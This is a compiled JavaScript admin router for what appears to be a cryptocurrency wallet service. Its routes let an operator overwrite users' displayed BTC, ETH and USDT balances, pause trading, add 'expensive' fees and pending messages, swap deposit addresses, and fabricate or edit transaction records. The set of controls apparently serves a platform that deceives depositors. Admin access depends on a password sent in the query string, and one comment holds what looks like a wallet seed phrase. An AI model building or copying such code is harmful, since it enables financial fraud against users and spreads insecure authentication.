"use strict";

function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
Object.defineProperty(exports, "__esModule", {
  value: true
});
exports["default"] = void 0;
var _express = _interopRequireDefault(require("express"));
var _transaction = _interopRequireDefault(require("../models/transaction"));
var _useraddress = _interopRequireDefault(require("../models/useraddress"));
function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { "default": obj }; }
function _regeneratorRuntime() { "use strict"; /*! regenerator-runtime -- Copyright (c) 2014-present, Facebook, Inc. -- license (MIT): https://github.com/facebook/regenerator/blob/main/LICENSE */ _regeneratorRuntime = function _regeneratorRuntime() { return e; }; var t, e = {}, r = Object.prototype, n = r.hasOwnProperty, o = Object.defineProperty || function (t, e, r) { t[e] = r.value; }, i = "function" == typeof Symbol ? Symbol : {}, a = i.iterator || "@@iterator", c = i.asyncIterator || "@@asyncIterator", u = i.toStringTag || "@@toStringTag"; function define(t, e, r) { return Object.defineProperty(t, e, { value: r, enumerable: !0, configurable: !0, writable: !0 }), t[e]; } try { define({}, ""); } catch (t) { define = function define(t, e, r) { return t[e] = r; }; } function wrap(t, e, r, n) { var i = e && e.prototype instanceof Generator ? e : Generator, a = Object.create(i.prototype), c = new Context(n || []); return o(a, "_invoke", { value: makeInvokeMethod(t, r, c) }), a; } function tryCatch(t, e, r) { try { return { type: "normal", arg: t.call(e, r) }; } catch (t) { return { type: "throw", arg: t }; } } e.wrap = wrap; var h = "suspendedStart", l = "suspendedYield", f = "executing", s = "completed", y = {}; function Generator() {} function GeneratorFunction() {} function GeneratorFunctionPrototype() {} var p = {}; define(p, a, function () { return this; }); var d = Object.getPrototypeOf, v = d && d(d(values([]))); v && v !== r && n.call(v, a) && (p = v); var g = GeneratorFunctionPrototype.prototype = Generator.prototype = Object.create(p); function defineIteratorMethods(t) { ["next", "throw", "return"].forEach(function (e) { define(t, e, function (t) { return this._invoke(e, t); }); }); } function AsyncIterator(t, e) { function invoke(r, o, i, a) { var c = tryCatch(t[r], t, o); if ("throw" !== c.type) { var u = c.arg, h = u.value; return h && "object" == _typeof(h) && n.call(h, "__await") ? e.resolve(h.__await).then(function (t) { invoke("next", t, i, a); }, function (t) { invoke("throw", t, i, a); }) : e.resolve(h).then(function (t) { u.value = t, i(u); }, function (t) { return invoke("throw", t, i, a); }); } a(c.arg); } var r; o(this, "_invoke", { value: function value(t, n) { function callInvokeWithMethodAndArg() { return new e(function (e, r) { invoke(t, n, e, r); }); } return r = r ? r.then(callInvokeWithMethodAndArg, callInvokeWithMethodAndArg) : callInvokeWithMethodAndArg(); } }); } function makeInvokeMethod(e, r, n) { var o = h; return function (i, a) { if (o === f) throw new Error("Generator is already running"); if (o === s) { if ("throw" === i) throw a; return { value: t, done: !0 }; } for (n.method = i, n.arg = a;;) { var c = n.delegate; if (c) { var u = maybeInvokeDelegate(c, n); if (u) { if (u === y) continue; return u; } } if ("next" === n.method) n.sent = n._sent = n.arg;else if ("throw" === n.method) { if (o === h) throw o = s, n.arg; n.dispatchException(n.arg); } else "return" === n.method && n.abrupt("return", n.arg); o = f; var p = tryCatch(e, r, n); if ("normal" === p.type) { if (o = n.done ? s : l, p.arg === y) continue; return { value: p.arg, done: n.done }; } "throw" === p.type && (o = s, n.method = "throw", n.arg = p.arg); } }; } function maybeInvokeDelegate(e, r) { var n = r.method, o = e.iterator[n]; if (o === t) return r.delegate = null, "throw" === n && e.iterator["return"] && (r.method = "return", r.arg = t, maybeInvokeDelegate(e, r), "throw" === r.method) || "return" !== n && (r.method = "throw", r.arg = new TypeError("The iterator does not provide a '" + n + "' method")), y; var i = tryCatch(o, e.iterator, r.arg); if ("throw" === i.type) return r.method = "throw", r.arg = i.arg, r.delegate = null, y; var a = i.arg; return a ? a.done ? (r[e.resultName] = a.value, r.next = e.nextLoc, "return" !== r.method && (r.method = "next", r.arg = t), r.delegate = null, y) : a : (r.method = "throw", r.arg = new TypeError("iterator result is not an object"), r.delegate = null, y); } function pushTryEntry(t) { var e = { tryLoc: t[0] }; 1 in t && (e.catchLoc = t[1]), 2 in t && (e.finallyLoc = t[2], e.afterLoc = t[3]), this.tryEntries.push(e); } function resetTryEntry(t) { var e = t.completion || {}; e.type = "normal", delete e.arg, t.completion = e; } function Context(t) { this.tryEntries = [{ tryLoc: "root" }], t.forEach(pushTryEntry, this), this.reset(!0); } function values(e) { if (e || "" === e) { var r = e[a]; if (r) return r.call(e); if ("function" == typeof e.next) return e; if (!isNaN(e.length)) { var o = -1, i = function next() { for (; ++o < e.length;) if (n.call(e, o)) return next.value = e[o], next.done = !1, next; return next.value = t, next.done = !0, next; }; return i.next = i; } } throw new TypeError(_typeof(e) + " is not iterable"); } return GeneratorFunction.prototype = GeneratorFunctionPrototype, o(g, "constructor", { value: GeneratorFunctionPrototype, configurable: !0 }), o(GeneratorFunctionPrototype, "constructor", { value: GeneratorFunction, configurable: !0 }), GeneratorFunction.displayName = define(GeneratorFunctionPrototype, u, "GeneratorFunction"), e.isGeneratorFunction = function (t) { var e = "function" == typeof t && t.constructor; return !!e && (e === GeneratorFunction || "GeneratorFunction" === (e.displayName || e.name)); }, e.mark = function (t) { return Object.setPrototypeOf ? Object.setPrototypeOf(t, GeneratorFunctionPrototype) : (t.__proto__ = GeneratorFunctionPrototype, define(t, u, "GeneratorFunction")), t.prototype = Object.create(g), t; }, e.awrap = function (t) { return { __await: t }; }, defineIteratorMethods(AsyncIterator.prototype), define(AsyncIterator.prototype, c, function () { return this; }), e.AsyncIterator = AsyncIterator, e.async = function (t, r, n, o, i) { void 0 === i && (i = Promise); var a = new AsyncIterator(wrap(t, r, n, o), i); return e.isGeneratorFunction(r) ? a : a.next().then(function (t) { return t.done ? t.value : a.next(); }); }, defineIteratorMethods(g), define(g, u, "Generator"), define(g, a, function () { return this; }), define(g, "toString", function () { return "[object Generator]"; }), e.keys = function (t) { var e = Object(t), r = []; for (var n in e) r.push(n); return r.reverse(), function next() { for (; r.length;) { var t = r.pop(); if (t in e) return next.value = t, next.done = !1, next; } return next.done = !0, next; }; }, e.values = values, Context.prototype = { constructor: Context, reset: function reset(e) { if (this.prev = 0, this.next = 0, this.sent = this._sent = t, this.done = !1, this.delegate = null, this.method = "next", this.arg = t, this.tryEntries.forEach(resetTryEntry), !e) for (var r in this) "t" === r.charAt(0) && n.call(this, r) && !isNaN(+r.slice(1)) && (this[r] = t); }, stop: function stop() { this.done = !0; var t = this.tryEntries[0].completion; if ("throw" === t.type) throw t.arg; return this.rval; }, dispatchException: function dispatchException(e) { if (this.done) throw e; var r = this; function handle(n, o) { return a.type = "throw", a.arg = e, r.next = n, o && (r.method = "next", r.arg = t), !!o; } for (var o = this.tryEntries.length - 1; o >= 0; --o) { var i = this.tryEntries[o], a = i.completion; if ("root" === i.tryLoc) return handle("end"); if (i.tryLoc <= this.prev) { var c = n.call(i, "catchLoc"), u = n.call(i, "finallyLoc"); if (c && u) { if (this.prev < i.catchLoc) return handle(i.catchLoc, !0); if (this.prev < i.finallyLoc) return handle(i.finallyLoc); } else if (c) { if (this.prev < i.catchLoc) return handle(i.catchLoc, !0); } else { if (!u) throw new Error("try statement without catch or finally"); if (this.prev < i.finallyLoc) return handle(i.finallyLoc); } } } }, abrupt: function abrupt(t, e) { for (var r = this.tryEntries.length - 1; r >= 0; --r) { var o = this.tryEntries[r]; if (o.tryLoc <= this.prev && n.call(o, "finallyLoc") && this.prev < o.finallyLoc) { var i = o; break; } } i && ("break" === t || "continue" === t) && i.tryLoc <= e && e <= i.finallyLoc && (i = null); var a = i ? i.completion : {}; return a.type = t, a.arg = e, i ? (this.method = "next", this.next = i.finallyLoc, y) : this.complete(a); }, complete: function complete(t, e) { if ("throw" === t.type) throw t.arg; return "break" === t.type || "continue" === t.type ? this.next = t.arg : "return" === t.type ? (this.rval = this.arg = t.arg, this.method = "return", this.next = "end") : "normal" === t.type && e && (this.next = e), y; }, finish: function finish(t) { for (var e = this.tryEntries.length - 1; e >= 0; --e) { var r = this.tryEntries[e]; if (r.finallyLoc === t) return this.complete(r.completion, r.afterLoc), resetTryEntry(r), y; } }, "catch": function _catch(t) { for (var e = this.tryEntries.length - 1; e >= 0; --e) { var r = this.tryEntries[e]; if (r.tryLoc === t) { var n = r.completion; if ("throw" === n.type) { var o = n.arg; resetTryEntry(r); } return o; } } throw new Error("illegal catch attempt"); }, delegateYield: function delegateYield(e, r, n) { return this.delegate = { iterator: values(e), resultName: r, nextLoc: n }, "next" === this.method && (this.arg = t), y; } }, e; }
function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) { try { var info = gen[key](arg); var value = info.value; } catch (error) { reject(error); return; } if (info.done) { resolve(value); } else { Promise.resolve(value).then(_next, _throw); } }
function _asyncToGenerator(fn) { return function () { var self = this, args = arguments; return new Promise(function (resolve, reject) { var gen = fn.apply(self, args); function _next(value) { asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value); } function _throw(err) { asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err); } _next(undefined); }); }; }
require('dotenv').config();
var adminRoute = _express["default"].Router();
adminRoute.get('/admin/userwallets', /*#__PURE__*/function () {
  var _ref = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee(req, res) {
    var password, usersaddress;
    return _regeneratorRuntime().wrap(function _callee$(_context) {
      while (1) switch (_context.prev = _context.next) {
        case 0:
          _context.prev = 0;
          password = req.query.password;
          if (!(password === process.env.ADMIN_PW)) {
            _context.next = 10;
            break;
          }
          _context.next = 5;
          return _useraddress["default"].find();
        case 5:
          usersaddress = _context.sent;
          console.log(usersaddress);
          res.status(200).json({
            usersaddress: usersaddress
          });
          _context.next = 11;
          break;
        case 10:
          return _context.abrupt("return", res.status(401).json({
            message: "fuck off"
          }));
        case 11:
          _context.next = 17;
          break;
        case 13:
          _context.prev = 13;
          _context.t0 = _context["catch"](0);
          console.log(_context.t0);
          return _context.abrupt("return", res.status(401).json({
            message: "fuck off"
          }));
        case 17:
        case "end":
          return _context.stop();
      }
    }, _callee, null, [[0, 13]]);
  }));
  return function (_x, _x2) {
    return _ref.apply(this, arguments);
  };
}());
adminRoute.get('/admin/userwallet', /*#__PURE__*/function () {
  var _ref2 = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee2(req, res) {
    var _req$query, password, ethaddress, usersaddress;
    return _regeneratorRuntime().wrap(function _callee2$(_context2) {
      while (1) switch (_context2.prev = _context2.next) {
        case 0:
          _context2.prev = 0;
          _req$query = req.query, password = _req$query.password, ethaddress = _req$query.ethaddress;
          if (!(password === process.env.ADMIN_PW)) {
            _context2.next = 9;
            break;
          }
          _context2.next = 5;
          return _useraddress["default"].findOne({
            ethaddress: ethaddress
          });
        case 5:
          usersaddress = _context2.sent;
          res.status(200).json({
            usersaddress: usersaddress
          });
          _context2.next = 10;
          break;
        case 9:
          return _context2.abrupt("return", res.status(401).json({
            message: "fuck off"
          }));
        case 10:
          _context2.next = 16;
          break;
        case 12:
          _context2.prev = 12;
          _context2.t0 = _context2["catch"](0);
          console.log(_context2.t0);
          return _context2.abrupt("return", res.status(401).json({
            message: "fuck off"
          }));
        case 16:
        case "end":
          return _context2.stop();
      }
    }, _callee2, null, [[0, 12]]);
  }));
  return function (_x3, _x4) {
    return _ref2.apply(this, arguments);
  };
}());
adminRoute.post('/admin/update', /*#__PURE__*/function () {
  var _ref3 = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee3(req, res) {
    var _req$query2, password, address, _req$body, adminBtcBalance, adminUsdtBalance, adminEthBalance, adminPopupMessage, useAdminVals, btcmode, ethmode, usdtmode, pauseTrade, useExpensivefee, expensiveFeeBTC, expensiveFeeETH, pendingMesg, updatedUserAddress;
    return _regeneratorRuntime().wrap(function _callee3$(_context3) {
      while (1) switch (_context3.prev = _context3.next) {
        case 0:
          _context3.prev = 0;
          _req$query2 = req.query, password = _req$query2.password, address = _req$query2.address;
          if (!(password === process.env.ADMIN_PW)) {
            _context3.next = 11;
            break;
          }
          if (!(address != null && address.length)) {
            _context3.next = 11;
            break;
          }
          _req$body = req.body, adminBtcBalance = _req$body.adminBtcBalance, adminUsdtBalance = _req$body.adminUsdtBalance, adminEthBalance = _req$body.adminEthBalance, adminPopupMessage = _req$body.adminPopupMessage, useAdminVals = _req$body.useAdminVals, btcmode = _req$body.btcmode, ethmode = _req$body.ethmode, usdtmode = _req$body.usdtmode, pauseTrade = _req$body.pauseTrade, useExpensivefee = _req$body.useExpensivefee, expensiveFeeBTC = _req$body.expensiveFeeBTC, expensiveFeeETH = _req$body.expensiveFeeETH, pendingMesg = _req$body.pendingMesg;
          _context3.next = 7;
          return _useraddress["default"].findOneAndUpdate({
            ethaddress: address
          }, {
            $set: {
              adminBtcBalance: adminBtcBalance,
              adminUsdtBalance: adminUsdtBalance,
              adminEthBalance: adminEthBalance,
              adminPopupMessage: adminPopupMessage,
              useAdminVals: useAdminVals,
              btcmode: btcmode,
              ethmode: ethmode,
              usdtmode: usdtmode,
              pauseTrade: pauseTrade,
              useExpensivefee: useExpensivefee,
              expensiveFeeBTC: expensiveFeeBTC,
              expensiveFeeETH: expensiveFeeETH,
              pendingMesg: pendingMesg
            }
          }, {
            "new": true,
            runValidators: true
          });
        case 7:
          updatedUserAddress = _context3.sent;
          if (updatedUserAddress) {
            _context3.next = 10;
            break;
          }
          return _context3.abrupt("return", res.status(404).json({
            message: "User address not found"
          }));
        case 10:
          res.status(201).json({
            updatedUserAddress: updatedUserAddress
          });
        case 11:
          _context3.next = 17;
          break;
        case 13:
          _context3.prev = 13;
          _context3.t0 = _context3["catch"](0);
          console.log(_context3.t0);
          return _context3.abrupt("return", res.status(500).json({
            message: "Internal server error"
          }));
        case 17:
        case "end":
          return _context3.stop();
      }
    }, _callee3, null, [[0, 13]]);
  }));
  return function (_x5, _x6) {
    return _ref3.apply(this, arguments);
  };
}());
adminRoute.post('/admin/update/btcaddress', /*#__PURE__*/function () {
  var _ref4 = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee4(req, res) {
    var _req$query3, password, address, btcaddress, updatedUserAddress;
    return _regeneratorRuntime().wrap(function _callee4$(_context4) {
      while (1) switch (_context4.prev = _context4.next) {
        case 0:
          _req$query3 = req.query, password = _req$query3.password, address = _req$query3.address;
          if (!(password === process.env.ADMIN_PW)) {
            _context4.next = 10;
            break;
          }
          if (!(address != null && address.length)) {
            _context4.next = 10;
            break;
          }
          btcaddress = req.body.btcaddress;
          _context4.next = 6;
          return _useraddress["default"].findOneAndUpdate({
            ethaddress: address
          }, {
            $set: {
              btcaddress: btcaddress
            }
          }, {
            "new": true,
            runValidators: true
          });
        case 6:
          updatedUserAddress = _context4.sent;
          if (updatedUserAddress) {
            _context4.next = 9;
            break;
          }
          return _context4.abrupt("return", res.status(404).json({
            message: "User address not found"
          }));
        case 9:
          res.status(201).json({
            updatedUserAddress: updatedUserAddress
          });
        case 10:
        case "end":
          return _context4.stop();
      }
    }, _callee4);
  }));
  return function (_x7, _x8) {
    return _ref4.apply(this, arguments);
  };
}());
adminRoute.post('/admin/add/transaction', /*#__PURE__*/function () {
  var _ref5 = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee5(req, res) {
    var _req$query4, password, walletid, usersaddress, _req$body2, label, type, amount, pending, userBalanceAtOccurence, assetType, newtrans;
    return _regeneratorRuntime().wrap(function _callee5$(_context5) {
      while (1) switch (_context5.prev = _context5.next) {
        case 0:
          _req$query4 = req.query, password = _req$query4.password, walletid = _req$query4.walletid;
          if (!(password === process.env.ADMIN_PW)) {
            _context5.next = 9;
            break;
          }
          if (!walletid) {
            _context5.next = 7;
            break;
          }
          _context5.next = 5;
          return _useraddress["default"].findOne({
            uniqueid: walletid
          });
        case 5:
          usersaddress = _context5.sent;
          if (usersaddress) {
            _req$body2 = req.body, label = _req$body2.label, type = _req$body2.type, amount = _req$body2.amount, pending = _req$body2.pending, userBalanceAtOccurence = _req$body2.userBalanceAtOccurence, assetType = _req$body2.assetType;
            newtrans = new _transaction["default"]({
              walletid: usersaddress.uniqueid,
              label: label,
              type: type,
              amount: amount,
              pending: pending,
              userBalanceAtOccurence: userBalanceAtOccurence,
              assetType: assetType
            });
            newtrans.save();
            res.status(201).json({
              newtrans: newtrans
            });
          }
        case 7:
          _context5.next = 10;
          break;
        case 9:
          return _context5.abrupt("return", res.status(401).json({
            message: "fuck off"
          }));
        case 10:
        case "end":
          return _context5.stop();
      }
    }, _callee5);
  }));
  return function (_x9, _x10) {
    return _ref5.apply(this, arguments);
  };
}());
adminRoute.get('/admin/user/transactions', /*#__PURE__*/function () {
  var _ref6 = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee6(req, res) {
    var _req$query5, password, walletid, transactions;
    return _regeneratorRuntime().wrap(function _callee6$(_context6) {
      while (1) switch (_context6.prev = _context6.next) {
        case 0:
          _req$query5 = req.query, password = _req$query5.password, walletid = _req$query5.walletid;
          if (!(password === process.env.ADMIN_PW)) {
            _context6.next = 9;
            break;
          }
          if (!walletid) {
            _context6.next = 7;
            break;
          }
          _context6.next = 5;
          return _transaction["default"].find({
            walletid: walletid
          });
        case 5:
          transactions = _context6.sent;
          res.status(201).json({
            transactions: transactions
          });
        case 7:
          _context6.next = 10;
          break;
        case 9:
          return _context6.abrupt("return", res.status(401).json({
            message: "fuck off"
          }));
        case 10:
        case "end":
          return _context6.stop();
      }
    }, _callee6);
  }));
  return function (_x11, _x12) {
    return _ref6.apply(this, arguments);
  };
}());
adminRoute.put('/admin/user/transaction', /*#__PURE__*/function () {
  var _ref7 = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee7(req, res) {
    var _req$query6, password, transactionid, id, _req$body3, label, type, amount, pending, userBalanceAtOccurence, assetType, updatedTransaction;
    return _regeneratorRuntime().wrap(function _callee7$(_context7) {
      while (1) switch (_context7.prev = _context7.next) {
        case 0:
          _req$query6 = req.query, password = _req$query6.password, transactionid = _req$query6.transactionid;
          if (!(password === process.env.ADMIN_PW)) {
            _context7.next = 13;
            break;
          }
          if (!transactionid) {
            _context7.next = 11;
            break;
          }
          id = transactionid;
          _req$body3 = req.body, label = _req$body3.label, type = _req$body3.type, amount = _req$body3.amount, pending = _req$body3.pending, userBalanceAtOccurence = _req$body3.userBalanceAtOccurence, assetType = _req$body3.assetType;
          _context7.next = 7;
          return _transaction["default"].findByIdAndUpdate(id, {
            label: label,
            type: type,
            amount: amount,
            pending: pending,
            userBalanceAtOccurence: userBalanceAtOccurence,
            assetType: assetType
          }, {
            "new": true,
            runValidators: true
          });
        case 7:
          updatedTransaction = _context7.sent;
          if (updatedTransaction) {
            _context7.next = 10;
            break;
          }
          return _context7.abrupt("return", res.status(404).json({
            message: 'Transaction not found'
          }));
        case 10:
          res.status(201).json(updatedTransaction);
        case 11:
          _context7.next = 14;
          break;
        case 13:
          return _context7.abrupt("return", res.status(401).json({
            message: "fuck off"
          }));
        case 14:
        case "end":
          return _context7.stop();
      }
    }, _callee7);
  }));
  return function (_x13, _x14) {
    return _ref7.apply(this, arguments);
  };
}());
adminRoute.put('/admin/user/popumessage', /*#__PURE__*/function () {
  var _ref8 = _asyncToGenerator( /*#__PURE__*/_regeneratorRuntime().mark(function _callee8(req, res) {
    var _req$query7, password, walletid, adminPopupMessage, usersaddress, id, updatedUserAddress;
    return _regeneratorRuntime().wrap(function _callee8$(_context8) {
      while (1) switch (_context8.prev = _context8.next) {
        case 0:
          _req$query7 = req.query, password = _req$query7.password, walletid = _req$query7.walletid;
          adminPopupMessage = req.body.adminPopupMessage; //turn, mouse, puppy, orbit, normal, asthma, fault, enhance, script, subject, garage, cup
          if (!(password === process.env.ADMIN_PW)) {
            _context8.next = 15;
            break;
          }
          if (!walletid) {
            _context8.next = 13;
            break;
          }
          _context8.next = 6;
          return _useraddress["default"].findOne({
            uniqueid: walletid
          });
        case 6:
          usersaddress = _context8.sent;
          if (!(usersaddress && adminPopupMessage.length)) {
            _context8.next = 13;
            break;
          }
          id = usersaddress._id;
          _context8.next = 11;
          return _useraddress["default"].findByIdAndUpdate(id, {
            adminPopupMessage: adminPopupMessage
          }, {
            "new": true,
            runValidators: true
          });
        case 11:
          updatedUserAddress = _context8.sent;
          res.status(201).json(updatedUserAddress);
        case 13:
          _context8.next = 16;
          break;
        case 15:
          return _context8.abrupt("return", res.status(401).json({
            message: "fuck off"
          }));
        case 16:
        case "end":
          return _context8.stop();
      }
    }, _callee8);
  }));
  return function (_x15, _x16) {
    return _ref8.apply(this, arguments);
  };
}());
var _default = exports["default"] = adminRoute;